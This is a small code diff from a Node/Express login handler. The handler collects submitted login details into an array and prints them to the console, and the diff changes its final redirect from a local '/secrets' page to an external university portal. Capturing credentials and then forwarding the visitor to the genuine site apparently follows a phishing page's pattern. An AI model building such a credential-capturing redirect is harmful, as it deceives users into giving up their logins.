@@ -38,7 +38,7 @@ app.post("/", function(req, res) {
   loginInfo.push(newUser);
   console.log(loginInfo);
 
-  res.redirect("/secrets");
+  res.redirect("https://moj.tvz.hr/");
 
 });
 
